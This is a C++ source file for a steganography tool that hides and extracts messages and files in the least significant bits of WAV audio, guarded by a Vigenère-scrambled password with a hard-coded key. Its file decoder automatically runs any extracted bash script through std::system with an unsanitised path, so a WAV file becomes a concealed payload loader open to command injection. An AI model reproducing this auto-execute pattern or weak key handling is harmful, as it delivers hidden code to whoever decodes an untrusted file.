#include "WAV.h"
#include "vigenere.h"
#include <sndfile.hh>
#include <vector>
#include <bitset>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <cstdlib> // For std::system

std::string Steganography::decodeMessageInWAV(const std::string& inputWav, 
                                         const std::string& password) {
    // Fixed Vigenère key for password unscrambling
    const std::string vigenereKey = "VIGENEREK";

    // Ensure password is exactly 8 characters
    if (password.size() != 8) {
        return "Error: Password must be exactly 8 characters long.";
    }

    // Open input WAV file
    SndfileHandle inputFile(inputWav);
    if (inputFile.error()) {
        return "Error reading input WAV file: " + std::string(inputFile.strError());
    }

    // Read audio samples
    std::vector<short> samples(inputFile.frames() * inputFile.channels());
    inputFile.read(&samples[0], samples.size());

    // Extract LSBs from audio samples
    std::string binaryData;
    for (size_t i = 0; i < samples.size(); ++i) {
        binaryData += (samples[i] & 1) ? '1' : '0';
    }

    // Read the first 32 bits to get the message length
    if (binaryData.size() < 32 + 64) { // 32 bits length + 64 bits password
        return "Error: Not enough data to read message length and password.";
    }

    uint32_t messageLength = 0;
    for (int i = 0; i < 32; i++) {
        messageLength = (messageLength << 1) | (binaryData[i] - '0');
    }

    // Read the next 64 bits for scrambled password
    std::string binaryPassword = binaryData.substr(32, 64);
    std::string scrambledPassword;
    for (size_t i = 0; i < binaryPassword.size(); i += 8) {
        std::string byteString = binaryPassword.substr(i, 8);
        char byte = static_cast<char>(std::bitset<8>(byteString).to_ulong());
        scrambledPassword += byte;
    }

    // Unscramble the password
    std::string unscrambledPassword = decryptVigenere(scrambledPassword, vigenereKey);

    // Compare with user-provided password
    if (unscrambledPassword != password) {
        std::cout << "Break In attempt detected, data deletion in..." << std::endl;
        for (int i = 5; i >= 0; --i) {
            std::cout << i << " ";
            std::flush(std::cout);
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        std::cout << std::endl;

        if (eraseHiddenData(inputWav)) {
            std::cerr << "Hidden data has been permanently erased." << std::endl;
        } else {
            std::cerr << "Failed to erase hidden data." << std::endl;
        }
        return "";
    }

    // Now read the message bits
    size_t totalMessageBits = messageLength * 8;
    if (binaryData.size() < 32 + 64 + totalMessageBits) {
        std::cerr << "Error: Not enough data to read the entire message." << std::endl;
        return "";
    }

    std::string binaryMessage = binaryData.substr(32 + 64, totalMessageBits);

    // Convert binary to message
    std::string message = binaryToMessage(binaryMessage);
    return message;
}

bool Steganography::decodeFileInWAV(const std::string& inputWav, 
                               const std::string& outputFilePath, 
                               const std::string& password) {
    // Fixed Vigenère key for password unscrambling
    const std::string vigenereKey = "VIGENEREK";

    // Ensure password is exactly 8 characters
    if (password.size() != 8) {
        std::cerr << "Error: Password must be exactly 8 characters long." << std::endl;
        return false;
    }

    // Open input WAV file
    SndfileHandle inputFile(inputWav);
    if (inputFile.error()) {
        std::cerr << "Error reading input WAV file: " << inputFile.strError() << std::endl;
        return false;
    }

    // Read audio samples
    std::vector<short> samples(inputFile.frames() * inputFile.channels());
    inputFile.read(&samples[0], samples.size());

    // Extract LSBs from audio samples
    std::string binaryData;
    for (size_t i = 0; i < samples.size(); ++i) {
        binaryData += (samples[i] & 1) ? '1' : '0';
    }

    // Read the first 32 bits to get the file length
    if (binaryData.size() < 32 + 64) { // 32 bits length + 64 bits password
        std::cerr << "Error: Not enough data to read file length and password." << std::endl;
        return false;
    }

    uint32_t fileLength = 0;
    for (int i = 0; i < 32; i++) {
        fileLength = (fileLength << 1) | (binaryData[i] - '0');
    }

    // Read the next 64 bits for scrambled password
    std::string binaryPassword = binaryData.substr(32, 64);
    std::string scrambledPassword;
    for (size_t i = 0; i < binaryPassword.size(); i += 8) {
        std::string byteString = binaryPassword.substr(i, 8);
        char byte = static_cast<char>(std::bitset<8>(byteString).to_ulong());
        scrambledPassword += byte;
    }

    // Unscramble the password
    std::string unscrambledPassword = decryptVigenere(scrambledPassword, vigenereKey);

    // Compare with user-provided password
    if (unscrambledPassword != password) {
        std::cout << "Break In attempt detected, data deletion in..." << std::endl;
        for (int i = 5; i >= 0; --i) {
            std::cout << i << " ";
            std::flush(std::cout);
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        std::cout << std::endl;

        if (eraseHiddenData(inputWav)) {
            std::cerr << "Hidden data has been permanently erased." << std::endl;
        } else {
            std::cerr << "Failed to erase hidden data." << std::endl;
        }
        return false;
    }

    // Now read the file bits
    size_t totalFileBits = fileLength * 8;
    if (binaryData.size() < 32 + 64 + totalFileBits) {
        std::cerr << "Error: Not enough data to read the entire file." << std::endl;
        return false;
    }

    std::string binaryFileData = binaryData.substr(32 + 64, totalFileBits);

    // Convert binary to file data
    bool success = binaryToFile(binaryFileData, outputFilePath);
    if (success) {
        std::cout << "File decoded successfully to " << outputFilePath << "\n";

        // Check if the file is a Bash script by verifying the shebang
        std::ifstream decodedFile(outputFilePath);
        if (decodedFile) {
            std::string firstLine;
            std::getline(decodedFile, firstLine);
            decodedFile.close();

            if (firstLine.find("#!/bin/bash") != std::string::npos || 
                firstLine.find("#!/usr/bin/env bash") != std::string::npos) {
                std::cout << "Detected a Bash script. Executing it..." << std::endl;
                std::string command = "bash " + outputFilePath;
                int ret = std::system(command.c_str());
                if (ret == 0) {
                    std::cout << "Bash script executed successfully." << std::endl;
                } else {
                    std::cerr << "Error executing the Bash script." << std::endl;
                }
            }
        }
    } else {
        std::cerr << "Failed to convert binary data to file." << std::endl;
    }
    return success;
}

std::string Steganography::binaryToMessage(const std::string& binaryData) {
    std::string message;
    for (size_t i = 0; i + 7 < binaryData.size(); i += 8) {
        std::string byteString = binaryData.substr(i, 8);
        if (byteString == "00000000") {
            // Null character detected, end of message
            break;
        }
        char c = static_cast<char>(std::bitset<8>(byteString).to_ulong());
        message += c;
    }
    return message;
}

bool Steganography::binaryToFile(const std::string& binaryData, const std::string& outputFilePath) {
    std::ofstream outputFile(outputFilePath, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Error: Unable to create output file " << outputFilePath << std::endl;
        return false;
    }

    for (size_t i = 0; i + 7 < binaryData.size(); i += 8) {
        std::string byteString = binaryData.substr(i, 8);
        char byte = static_cast<char>(std::bitset<8>(byteString).to_ulong());
        outputFile << byte;
    }

    outputFile.close();
    return true;
}

bool Steganography::eraseHiddenData(const std::string& wavPath) {
    // Open input WAV file
    SndfileHandle inputFile(wavPath);
    if (inputFile.error()) {
        std::cerr << "Error reading WAV file for data erasure: " << inputFile.strError() << std::endl;
        return false;
    }

    // Read audio samples
    std::vector<short> samples(inputFile.frames() * inputFile.channels());
    inputFile.read(&samples[0], samples.size());

    // Erase the LSBs by setting them to 0
    for (size_t i = 0; i < samples.size(); ++i) {
        samples[i] &= ~1; // Set LSB to 0
    }

    // Write modified samples back to the WAV file
    SndfileHandle outputFile(wavPath, SFM_WRITE, inputFile.format(), inputFile.channels(), inputFile.samplerate());
    if (outputFile.error()) {
        std::cerr << "Error writing WAV file for data erasure: " << outputFile.strError() << std::endl;
        return false;
    }
    outputFile.write(&samples[0], samples.size());

    return true;
}
